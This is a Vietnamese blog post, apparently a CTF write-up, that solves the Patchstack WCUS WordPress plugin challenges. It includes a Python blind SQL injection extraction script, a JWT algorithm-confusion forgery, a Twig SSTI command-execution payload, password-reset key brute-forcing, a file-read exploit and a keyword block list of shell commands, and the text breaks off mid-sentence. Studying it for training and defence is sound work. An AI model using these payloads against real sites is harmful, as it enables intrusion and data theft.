<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Writeup Patchstack WCUS CTF | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="WriteUp,CTF,ContentCreator"><meta name=description content="Trong thời gian gần đây, Patchstack đã tổ chức cuộc thi Patchstack WCUS CTF, bao gồm 9 thử thách (challenge), tất cả đều tập trung vào việc khai thác các lỗ hổng bảo mật trong các plugin WordPress. Sau đây là một số writeup về các thử thách đó.
Tất cả các challenge đều được cung cấp dưới dạng whitebox.
WP Elevator Trong challenge này, đề bài cung cấp cho chúng ta một plugin WordPress."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Writeup Patchstack WCUS CTF"><meta property="og:description" content="Trong thời gian gần đây, Patchstack đã tổ chức cuộc thi Patchstack WCUS CTF, bao gồm 9 thử thách (challenge), tất cả đều tập trung vào việc khai thác các lỗ hổng bảo mật trong các plugin WordPress. Sau đây là một số writeup về các thử thách đó.
Tất cả các challenge đều được cung cấp dưới dạng whitebox.
WP Elevator Trong challenge này, đề bài cung cấp cho chúng ta một plugin WordPress."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-21T16:28:54+07:00"><meta property="article:modified_time" content="2024-09-21T16:28:54+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Writeup Patchstack WCUS CTF"><meta name=twitter:description content="Trong thời gian gần đây, Patchstack đã tổ chức cuộc thi Patchstack WCUS CTF, bao gồm 9 thử thách (challenge), tất cả đều tập trung vào việc khai thác các lỗ hổng bảo mật trong các plugin WordPress. Sau đây là một số writeup về các thử thách đó.
Tất cả các challenge đều được cung cấp dưới dạng whitebox.
WP Elevator Trong challenge này, đề bài cung cấp cho chúng ta một plugin WordPress."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Writeup Patchstack WCUS CTF","item":"https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Writeup Patchstack WCUS CTF","name":"Writeup Patchstack WCUS CTF","description":"Trong thời gian gần đây, Patchstack đã tổ chức cuộc thi Patchstack WCUS CTF, bao gồm 9 thử thách (challenge), tất cả đều tập trung vào việc khai thác các lỗ hổng bảo mật trong các plugin WordPress. Sau đây là một số writeup về các thử thách đó.\nTất cả các challenge đều được cung cấp dưới dạng whitebox.\nWP Elevator Trong challenge này, đề bài cung cấp cho chúng ta một plugin WordPress.","keywords":["WriteUp","CTF","ContentCreator"],"articleBody":"Trong thời gian gần đây, Patchstack đã tổ chức cuộc thi Patchstack WCUS CTF, bao gồm 9 thử thách (challenge), tất cả đều tập trung vào việc khai thác các lỗ hổng bảo mật trong các plugin WordPress. Sau đây là một số writeup về các thử thách đó.\nTất cả các challenge đều được cung cấp dưới dạng whitebox.\nWP Elevator Trong challenge này, đề bài cung cấp cho chúng ta một plugin WordPress. Nhiệm vụ của chúng ta là gọi đúng endpoint để lấy được flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  add_action(\"wp_ajax_patchstack_flagger\", \"flagger_request_callback\"); function flagger_request_callback() { // Validate nonce  $nonce = isset($_REQUEST[\"nonce\"]) ? sanitize_text_field($_REQUEST[\"nonce\"]) : \"\"; if (!wp_verify_nonce($nonce, \"get_latest_posts_nonce\")) { wp_send_json_error(\"Invalid nonce.\"); return; } $user = wp_get_current_user(); $allowed_roles = [\"administrator\", \"subscriber\"]; if (array_intersect($allowed_roles, $user-roles)) { $value = file_get_contents('/flag.txt'); wp_send_json_success([\"value\" = $value]); } else { wp_send_json_error(\"Missing permission.\"); } }   Vậy, chỉ cần chúng ta có được role administrator hoặc subscriber, chúng ta sẽ nhận được flag.\nNhưng làm thế nào để có thể đăng ký một tài khoản subscriber? Trong mã nguồn, có một đoạn code cho phép tạo người dùng mới với role subscriber.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  function create_user_via_api($request) { $parameters = $request-get_json_params(); $username = sanitize_text_field($parameters[\"username\"]); $email = sanitize_email($parameters[\"email\"]); $password = wp_generate_password(); // Create user  $user_id = wp_create_user($username, $password, $email); if (is_wp_error($user_id)) { return new WP_Error( \"user_creation_failed\", __(\"User creation failed.\", \"text_domain\"), [\"status\" = 500] ); } // Add user role  $user = new WP_User($user_id); $user-set_role(\"subscriber\"); return [ \"message\" = __(\"User created successfully.\", \"text_domain\"), \"user_id\" = $user_id, ]; }   Yêu cầu POST để tạo tài khoản mới:\n1 2 3 4 5 6 7  POST /wp-json/user/v1/create HTTP/1.1 Content-Type: application/json { \"username\": \"newuser\", \"email\": \"newuser@example.com\" }   Tuy nhiên, khi tạo người dùng mới, chỉ có username và email được truyền đi, mà không có mật khẩu để đăng nhập. Plugin này còn cung cấp một tính năng khác là reset_password_key_callback(), cho phép yêu cầu reset mật khẩu cho bất kỳ tài khoản nào. Chúng ta có thể sử dụng $key được tạo từ get_password_reset_key2() để thực hiện việc reset mật khẩu.\nRequest yêu cầu reset password:\n1 2 3 4  POST /wp-admin/admin-ajax.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 action=reset_key\u0026user_id=71   Tuy nhiên, $key được tạo ra chỉ có 1 ký tự duy nhất, điều này cho phép chúng ta brute force key để reset mật khẩu cho tài khoản subscriber vừa tạo.\n1  $key = wp_generate_password(1, false);   Do môi trường của tôi không được cấu hình server mail, nên tôi gặp khó khăn trong việc xác định chính xác endpoint để reset mật khẩu bằng key. Sau khi tham khảo ChatGPT, tôi đã nhận được câu trả lời như sau:\nTôi đã thử sử dụng endpoint này để reset mật khẩu cho tài khoản subscriber.Tuy nhiên, sau đó tôi phát hiện ra một endpoint tốt hơn để thực hiện việc này.\n1 2 3 4  POST /wp-login.php?action=resetpass HTTP/1.1 Content-Type: application/x-www-form-urlencoded pass1=123\u0026pw_weak=on\u0026pass2=123\u0026rp_key=R\u0026wp-submit=Save+Password   Sau khi reset thành công và có được tài khoản subscriber, tôi tiếp tục gửi yêu cầu đến hàm get_latest_posts_callback để lấy giá trị nonce:\n1 2 3 4 5  POST /wp-admin/admin-ajax.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie:  action=get_latest_posts_callback   Khi đã có nonce, tôi chỉ cần gửi yêu cầu tới flagger_request_callback() và truyền giá trị nonce đó để nhận flag:\n1 2 3 4 5  POST /wp-admin/admin-ajax.php HTTP/1.1 Cookie:  Content-Type: application/x-www-form-urlencoded action=patchstack_flagger\u0026nonce=b920667f1a   Link Manager Đập vào mắt đầu tiên là đoạn code dễ dàng bị khai thác SQL Injection tại:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  function get_link_data() { global $wpdb; $table_name = $wpdb-prefix . 'links'; $link_name = sanitize_text_field($_POST['link_name']); $order = sanitize_text_field($_POST['order']); $orderby = sanitize_text_field($_POST['orderby']); validate_order($order); validate_order_by($orderby); $results = $wpdb-get_results(\"SELECT * FROM wp_links where link_name = '$link_name' order by $orderby$order\"); if (!empty($results)) { wp_send_json_success($results); } else { wp_send_json_error('No data found.'); } }   Mặc dù có đoạn validate dữ liệu truyền vào, nhưng nó chỉ để đánh lừa và không thực sự ngăn chặn được SQL Injection. Chúng ta vẫn có thể khai thác lỗ hổng qua biến $orderby $order.\nĐể khai thác được lỗ hổng này, trước tiên cần thêm dữ liệu vào mà không cần xác thực thông qua hook sau:\n1  add_action( 'wp_ajax_nopriv_submit_link', 'handle_ajax_link_submission' );   Chúng ta có thể gửi yêu cầu thêm dữ liệu và lấy giá trị nonce từ trang chủ, thông qua biến var ajaxNonce = 'bb01b00013';:\n1 2 3 4  POST /wp-admin/admin-ajax.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded action=submit_link\u0026url=http://example.com\u0026name=test\u0026description=test\u0026nonce=bb01b00013   Khai thác SQL Injection Trong đoạn truy vấn SQL sau:\n1  $results = $wpdb-get_results(\"SELECT * FROM wp_links where link_name = '$link_name' order by $orderby$order\");   Chúng ta có thể khai thác SQL Injection qua order by, nhưng do response không hiển thị lỗi nên không thể sử dụng kỹ thuật error-based SQLi. Thay vào đó, có hai cách khai thác: time-based blind SQL Injection hoặc boolean-based blind SQL Injection.\nTôi đã chọn cách khai thác bằng boolean-based blind SQL Injection vì cách này nhanh hơn cho brute force. Payload sử dụng có dạng (cảm ơn người anh homie đã chia sẻ payload này):\n1  (SELECT(CASEWHEN(1=1)THEN1ELSE6096*(SELECT6096FROMinformation_schema.tables)END))  Chỉ cần thay phần 1=1 bằng các điều kiện boolean hoặc time-based khác là được. Tôi đã chọn sử dụng boolean-based vì nó hiệu quả hơn trong trường hợp này.\n Lưu ý: Công cụ sqlmap không thể khai thác lỗ hổng này do hạn chế trong việc gửi payload. Nếu có cách sử dụng tốt hơn, các bạn đọc có thể gợi ý thêm nhé. Vì không thể khai thác tự động bằng công cụ, tôi đành phải “manual” 😥.\n Trong quá trình khai thác, tôi gặp hai vấn đề lớn:\n Không thể sử dụng dấu '. Không thể so sánh chuỗi.  Nguyên nhân không sử dụng được dấu ' là do tính năng Addslashes của WordPress mà tôi đã trình bày trong bài viết trước. Việc này cũng khiến không thể so sánh chuỗi một cách thông thường.\nGiải pháp thay thế là sử dụng các hàm số để so sánh. Tôi chuyển qua so sánh bằng số và sử dụng hàm ASCII() để chuyển đổi ký tự sang mã số, đồng thời sử dụng hàm CHAR() để lấy tên cột. Flag của challenge này nằm trong bảng wp_options với tên cột là flag_links_data.\nVới sự hỗ trợ của ChatGPT, tôi đã viết một script để khai thác lỗ hổng này:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  import requests import string url = 'http://100.25.255.51:9097/wp-admin/admin-ajax.php' target_table = '' def test_sqli(payload): data = { 'action': 'get_link_data', 'link_name': 'test', 'order': '', 'orderby': payload } headers = { 'Content-Type': 'application/x-www-form-urlencoded' } response = requests.post(url, data=data, headers=headers) try: result = response.json() if result.get('success') == False: return False return True except ValueError: return False def brute_force_flag_links_data(): flag_value = '' char_set = string.ascii_letters + string.digits + string.punctuation while True: found = False for char in range(32, 127): payload = f\"(SELECT (CASE WHEN (SELECT ASCII(SUBSTRING(option_value,{len(flag_value)+1},1)) FROM wordpress.wp_options WHERE option_name=CHAR(102,108,97,103,95,108,105,110,107,115,95,100,97,116,97)) = {char}THEN 1 ELSE 6096*(SELECT 6096 FROM information_schema.tables) END))\" if test_sqli(payload): flag_value += chr(char) print(f\"Đã tìm thấy: {flag_value}\") found = True break if not found: break print(f\"Giá trị flag_links_data là: {flag_value}\") brute_force_flag_links_data()   JustinWonkyTokens Đề bài cung cấp một plugin sử dụng JWT (JSON Web Token) để xác thực, và nhiệm vụ của chúng ta là lấy được JWT với role=admin để có được flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  function simple_jwt_handler() { $flag = file_get_contents('/flag.txt'); $privateKey = file_get_contents('/jwt.key'); $publicKey = EOD-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw 3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU dwIDAQAB -----END PUBLIC KEY----- EOD; $issuedAt = new DateTimeImmutable(); $data = [ \"role\" = \"guest\", \"iat\" = $issuedAt-getTimestamp(), \"nbf\" = $issuedAt-getTimestamp() ]; if (!isset($_COOKIE['simple_jwt'])) { setcookie('simple_jwt', SimpleJWTHandler::encodeToken($data, $privateKey, 'RS256')); echo 'JWT has been set.'; } else { $token = $_COOKIE['simple_jwt']; try { $decoded = SimpleJWTHandler::decodeToken($token, $publicKey); if ($decoded-role == 'admin') { echo 'Success: ' . $flag; } elseif ($decoded-role == 'guest') { echo 'Role is guest.'; } } catch (Exception $e) { echo 'Token verification failed.'; } } }   Khi gửi yêu cầu tới wp-ajax.php với action=simple_jwt_handler, nếu không có giá trị $_COOKIE['simple_jwt'], plugin sẽ trả về một JWT với role=guest, được mã hóa bằng thuật toán RS256. Do chúng ta không biết được private.key, nên việc chỉnh sửa JWT để chuyển từ role=guest sang role=admin là không khả thi.\nTiếp theo, hãy kiểm tra hàm SimpleJWTHandler::decodeToken($token, $publicKey):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  public static function decodeToken($token, $key = null, $verify = true) { $segments = explode('.', $token); if (count($segments) != 3) { throw new UnexpectedValueException('Invalid token structure'); } list($header64, $payload64, $signature64) = $segments; $header = self::jsonDecode(self::urlSafeBase64Decode($header64)); $payload = self::jsonDecode(self::urlSafeBase64Decode($payload64)); $signature = self::urlSafeBase64Decode($signature64); if ($verify) { if (empty($header-alg)) { throw new DomainException('Algorithm missing'); } if (is_array($key)) { if (isset($header-kid)) { $key = $key[$header-kid]; } else { throw new DomainException('Key ID missing'); } } if (!self::verifySignature(\"$header64.$payload64\", $signature, $key, $header-alg)) { throw new UnexpectedValueException('Signature verification failed'); } if (isset($payload-exp) \u0026\u0026 time() = $payload-exp) { throw new UnexpectedValueException('Token expired'); } } return $payload; }   Chúng ta thấy rằng hàm decodeToken sử dụng $token và $publicKey để xác thực JWT. Tuy nhiên, có một lỗ hổng ở đây: thuật toán mã hóa JWT (alg) không được cố định mà được lấy từ header của JWT mà người dùng gửi vào. Điều này cho phép chúng ta thay đổi thuật toán mã hóa từ RS256 sang HS256. Với HS256, JWT sẽ sử dụng publicKey của server làm khóa bí mật để mã hóa thay vì privateKey.\nĐiều này có nghĩa là chúng ta có thể giả mạo JWT với role=admin bằng cách sử dụng thuật toán HS256 và ký lại JWT bằng publicKey mà server đã cung cấp.\nVới lỗ hổng đã phát hiện, chúng ta chỉ cần chỉnh sửa một chút ở phần mã hóa JWT để có thể tạo ra một JWT với role=admin. Thay vì sử dụng thuật toán RS256, chúng ta sẽ chuyển sang sử dụng HS256 và ký lại JWT bằng publicKey mà server đã cung cấp.\nDưới đây là đoạn code đã được chỉnh sửa:\n1 2 3 4 5 6 7 8 9 10  $data = [ \"role\" = \"admin\", \"iat\" = $issuedAt-getTimestamp(), \"nbf\" = $issuedAt-getTimestamp() ]; if (!isset($_COOKIE['simple_jwt'])) { setcookie('simple_jwt', SimpleJWTHandler::encodeToken($data, $publicKey, 'HS256')); echo 'JWT has been set.'; }   Với đoạn mã này, chúng ta đã tạo được một JWT với role=admin, sử dụng thuật toán HS256 và publicKey từ server để ký lại JWT. Sau khi có được JWT này từ môi trường local, chỉ cần gửi JWT lên server bằng cách đính kèm nó vào Cookie, và gửi một request tới server. Nếu token đã được chỉnh sửa đúng cách, server sẽ xác thực JWT với role=admin và trả về flag.\nCụ thể, sau khi có JWT, bạn chỉ cần POST nó lên server thông qua:\n1 2  POST /wp-ajax.php?action=simple_jwt_handler HTTP/1.1 Cookie: simple_jwt=   Vậy là bạn sẽ nhận được flag\nTimberlake Đề bài cung cấp một theme WordPress với file index.php được sử dụng để hiển thị nội dung trang. Ở phần này, điểm cần chú ý là tham số page được truyền qua URL, và sau đó nội dung được render thông qua Timber::render($page, $context). Tuy nhiên, để có thể render file template thành công, tham số page phải qua hàm validate($_REQUEST['page']). Dưới đây, tôi sẽ giải thích chi tiết hơn các bước xử lý và các cơ chế bảo vệ của đoạn mã này.\nGiải thích chi tiết các phần quan trọng:   Cơ chế xác định template:\n1 2 3 4  $page = 'template-home.twig'; if(isset($_REQUEST['page']) \u0026\u0026 validate($_REQUEST['page'])){ $page = $_REQUEST['page']; };   Trong đoạn này, biến $page sẽ nhận giá trị từ tham số page trong request nếu hàm validate() trả về true. Nếu không, mặc định template được sử dụng là template-home.twig. Điều này có nghĩa rằng để render một file khác, giá trị của tham số page phải thỏa mãn các điều kiện kiểm tra trong hàm validate().\n  Hàm validate(): Đây là hàm kiểm tra quan trọng để đảm bảo file được truyền qua tham số page an toàn và hợp lệ. Các bước kiểm tra bao gồm:\n  Kiểm tra tên file:\n1  if (isset($filename) \u0026\u0026 !empty($filename) \u0026\u0026 !in_array($filename, array('.php', '.htm', '.html', '.phtml', '.xhtml'))) {   Tên file phải không rỗng và không được nằm trong danh sách các file có phần mở rộng nguy hiểm như .php, .htm, .html, v.v. Điều này giúp ngăn chặn việc sử dụng các file có khả năng thực thi mã độc.\n  Kiểm tra nội dung file:\n1 2 3 4 5  if(is_timber_template(file_get_contents($fullPath)) === true) { if(is_valid_template(file_get_contents($fullPath)) === true) { return 1; } }   Sau khi xác định rằng tên file hợp lệ, nội dung của file sẽ được đọc và kiểm tra qua hai hàm is_timber_template() và is_valid_template() để đảm bảo rằng file không chứa các đoạn mã nguy hiểm.\n    Hàm is_timber_template():\n1 2 3 4 5 6 7 8  function is_timber_template($content) { $pattern = '/({{.*?}}|{%.*?%}|{#.*?#})/'; if (preg_match($pattern, $content)) { return true; } else { return false; } }   Hàm này kiểm tra xem file có chứa các biểu thức liên quan đến Timber template engine (như {{ }}, {% %}, hoặc {# #}). Nếu file có chứa các đoạn mã này, nó được coi là một template hợp lệ để Timber có thể render.\n  Hàm is_valid_template():\n1 2 3 4 5 6 7 8  function is_valid_template($content) { $pattern = '/\\b(filter|system|cat|bash|bin|exec|_self|env|dump|app|sort|tac|file_excerpt|\\/bin|FILENAME)\\b/i'; if (preg_match($pattern, $content)) { return false; } else { return true; } }   Hàm này kiểm tra xem nội dung file có chứa các từ khóa nguy hiểm như system, exec, cat, bash, env, v.v. Đây là các từ khóa có thể liên quan đến việc thực thi lệnh hệ thống hoặc thao tác với file, vì vậy nếu chúng xuất hiện, file sẽ bị từ chối để tránh các cuộc tấn công RCE (Remote Code Execution).\n  Cách khai thác tiềm năng: Tuy đoạn mã đã có các cơ chế kiểm tra để ngăn chặn việc sử dụng các file nguy hiểm hoặc nội dung độc hại, nhưng có thể tận dụng nếu biết trước các tên file hợp lệ trên server. Cụ thể:\n  SSTI (Server-Side Template Injection): Do tham số page được sử dụng để render file template bằng Timber, nếu có thể đoán được tên file template hợp lệ, có thể khai thác SSTI. Tuy nhiên, do có các biện pháp kiểm tra nội dung template qua hàm is_timber_template() và is_valid_template(), việc trực tiếp thực hiện RCE bằng SSTI qua các từ khóa nguy hiểm như system hay exec là khó thực hiện.\n  Bypass validate(): Để vượt qua hàm validate(), bạn cần cung cấp giá trị page với một tên file chính xác, không chứa phần mở rộng bị cấm, và không chứa các từ khóa bị cấm trong nội dung.\n  Phân tích tiếp theo Trong đoạn code mà bài viết đề cập, có một chức năng lưu trữ dữ liệu vào session thông qua hàm save_session(). Điểm đáng chú ý là dữ liệu từ request có thể được lưu vào file session trên server thông qua hàm session_start(), và file này sẽ nằm trong thư mục /tmp, điều này có thể dẫn đến một khả năng khai thác thú vị.\nPhân tích chi tiết đoạn code save_session(): 1 2 3 4 5 6 7 8 9 10 11  function save_session() { start_session(); if (isset($_REQUEST['session_data'])) { $_SESSION['session_data'] = stripslashes($_REQUEST['session_data']); wp_send_json_success('Data is saved to session.'); } else { wp_send_json_error('Some error happened.'); } } add_action('wp_ajax_save_session', 'save_session'); add_action('wp_ajax_nopriv_save_session', 'save_session');     Hàm save_session():\n Hàm này sẽ bắt đầu một session với start_session(). Nếu có tham số session_data được gửi thông qua request, nó sẽ lưu dữ liệu đó vào biến $_SESSION['session_data'] và phản hồi lại client thông qua JSON rằng dữ liệu đã được lưu thành công. Nếu không có tham số này, nó sẽ trả về lỗi.    Session file:\n Khi hàm start_session() được gọi, một file session sẽ được tạo ra trong thư mục /tmp với tên dạng sess_xxx, trong đó xxx là session ID. Dữ liệu được lưu trữ trong session sẽ được ghi vào file này. Điều này bao gồm cả nội dung của $_SESSION['session_data'], tức là giá trị của $_REQUEST['session_data'] sẽ được ghi vào file session trong thư mục /tmp.    Khai thác khả năng lưu SSTI vào session file: Dựa trên cơ chế xử lý này, chúng ta có thể lợi dụng để lưu một payload khai thác SSTI vào file session trong thư mục /tmp. Như đã phân tích ở phần trước, hàm validate() trong bài kiểm tra các điều kiện để quyết định xem file nào có thể được render bởi Timber. Điều quan trọng là hàm này cho phép truy cập vào các file nằm trong thư mục /tmp, vì Timber đã được cấu hình để tìm kiếm template ở cả thư mục /tmp và templates thông qua đoạn code:\n1  Timber::$dirname = array('../../../../../../../../../../../../tmp', 'templates');   Điều này có nghĩa là, nếu chúng ta lưu một payload SSTI hợp lệ vào file session, chúng ta có thể lợi dụng để Timber render file đó như một template và kích hoạt lỗ hổng SSTI.\nCách khai thác:   Lưu payload SSTI vào session file:\nChúng ta có thể gửi một request tới action save_session với tham số session_data chứa payload SSTI.\nPayload SSTI:\n1  {{['grep . /flag.txt']|map('passthru')}}}    Do ở đây hàm filter có chặn những từ khoá như system, cat, .v.v.. nên sử dụng payload trên thì 👌\n Gửi request để lưu payload này vào session:\n1 2 3 4  POST /wp-admin/admin-ajax.php?action=save_session Content-Type: application/x-www-form-urlencoded session_data={{['grep . /flag.txt']|map('passthru')}}}     Xác định tên file session:\nFile session sẽ có tên dạng sess_. Session ID này có thể được lấy từ cookie của trình duyệt sau khi gửi request đầu tiên hoặc bằng cách tìm session ID trực tiếp trên server (nếu có quyền truy cập).\n  Render file session:\n Sau khi lưu payload vào session file, chúng ta có thể thực hiện cuộc tấn công SSTI bằng cách gửi request đến endpoint với tham số page trỏ đến file session vừa tạo. Tên file session sẽ là sess_.  1  GET /wp-admin/admin-ajax.php?page=sess_   Và đọc được flag\n  Texting Trouble Với challeng này, chúng ta cùng phân tích hàm send_message_callback()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107  public function send_message_callback() { $error = 0; $formdata = $_POST['formdata']; parse_str($formdata, $output); $message = sanitize_textarea_field($output['jotac-plugin-messages']['jot-message']); $mess_type = sanitize_text_field($output['jotac-plugin-messages']['jot-message-type']); $mess_suffix = sanitize_text_field($output['jotac-plugin-messages']['jot-message-suffix']); $mess_attachment = sanitize_text_field($output['jotac-plugin-messages']['jot-attachment']); $jotmemkey = sanitize_text_field($_POST['jotmemid']); $jotseckey = sanitize_text_field($_POST['sec']); if (!empty($jotmemkey)) { list($jotgrpid,$jotmemid) = explode(\"-\", $jotmemkey, 2); $member = $this-get_member($jotmemid); } if (empty($jotseckey) || JOTAC_Plugin()-key!==$jotseckey) { // Bail out  die(); } if (empty($message)) { // Empty message  $error = 3; } if ($error == 0) { if (JOTAC_Plugin()-currentsmsprovider) { // Save message type  $smsmessage = get_option('jotac-plugin-messages'); $smsmessage['jot-message-type'] = $mess_type; // Save message suffix  $smsmessage['jot-message-suffix'] = $mess_suffix; // Save message content  $smsmessage['jot-message'] = $message; update_option('jotac-plugin-messages',$smsmessage); // Replace tags in message  $message = $this-get_replace_tags($message,$member); // Append Message suffix  if (!empty($mess_suffix)) { $fullmessage = $message . \" \" . $mess_suffix ; } else { $fullmessage = $message; } // Optional attachment  if (!empty($mess_attachment)) { if (preg_match('/^[a-zA-Z]+:\\/\\//', $mess_attachment)) { $error = 6; $additional_error = \"Incorrect format\"; } $allowed_extensions = ['txt','png','jpg','pdf']; if (!in_array(pathinfo($mess_attachment, PATHINFO_EXTENSION), $allowed_extensions)) { $error = 6; $additional_error = \"Filetype not supported\"; } else { $wp_dir = wp_upload_dir(); $attachment_fp = $wp_dir['basedir'] . '/attachments/' . $mess_attachment; $available_files = array_diff(scandir(dirname($attachment_fp)), array('.', '..')); $existing_files = []; foreach ($available_files as $f) { $existing_files[] = $f; } if (in_array(basename($attachment_fp), $existing_files)) { $attachment_raw = file_get_contents($attachment_fp); } else { $error = 6; $additional_error = \"File does not exist among [\".implode(', ', $existing_files).\"]\"; } } } $fullmessage = apply_filters('jot-send-message-messagetext',$fullmessage); if (!empty($member)) { $message_type = sanitize_text_field($output['jotac-plugin-messages']['jot-message-type']); switch ( $message_type ) { case 'jot-sms'; $message_error = JOTAC_Plugin()-currentsmsprovider-send_smsmessage($member['jot_grpmemnum'],$fullmessage,$attachment_raw); break; case 'jot-call'; $message_error = JOTAC_Plugin()-currentsmsprovider-send_callmessage($member['jot_grpmemnum'],$fullmessage); break; } } if ($message_error['send_message_errorcode'] != 0) { //An error occurred sending the message  $error = 999; } $all_send_errors[] = $message_error; } else { $error = 1; } }   Tại đây có thể thấy được đoạn code\n1  $attachment_raw = file_get_contents($attachment_fp);   có thể tấn công được thông qua file_get_contents() để đọc flag. Hàm này được sử dụng để đọc nội dung file đính kèm từ đường dẫn $attachment_fp. Nếu chúng ta có thể kiểm soát đầu vào của biến $mess_attachment, việc chỉ định một file cụ thể, như /flag.txt, sẽ cho phép hệ thống đọc nội dung của file đó thông qua file_get_contents().\nPhân tích lỗ hổng trong hàm send_message_callback() và khai thác qua file_get_contents() Dữ liệu từ $_POST['formdata'] được xử lý bằng các hàm như sanitize_textarea_field() và sanitize_text_field(), bao gồm giá trị mess_attachment. Hệ thống kiểm tra xem file đính kèm có tồn tại trong thư mục /attachments/ và có định dạng hợp lệ hay không. Tuy nhiên, nếu chỉ định một đường dẫn trực tiếp đến file nhạy cảm như /flag.txt, hàm file_get_contents() vẫn có thể đọc được nội dung của file này nếu nó tồn tại trên hệ thống.\nSau khi nội dung file được đọc, nếu xảy ra lỗi trong quá trình gửi tin nhắn, chẳng hạn do nhà cung cấp dịch vụ SMS, hệ thống sẽ trả về thông báo lỗi chứa thông tin về file vừa đọc. Lỗ hổng này tạo ra cơ hội để trích xuất thông tin nhạy cảm từ file mà không cần phải vượt qua các rào cản bảo mật khác.\nChúng ta có thể khai thác bằng cách gửi một yêu cầu POST tới hệ thống với giá trị mess_attachment trỏ trực tiếp đến file /flag.txt. Nếu có lỗi phát sinh trong quá trình gửi tin nhắn (như trong trường hợp nhà cung cấp dịch vụ SMS không khả dụng), nội 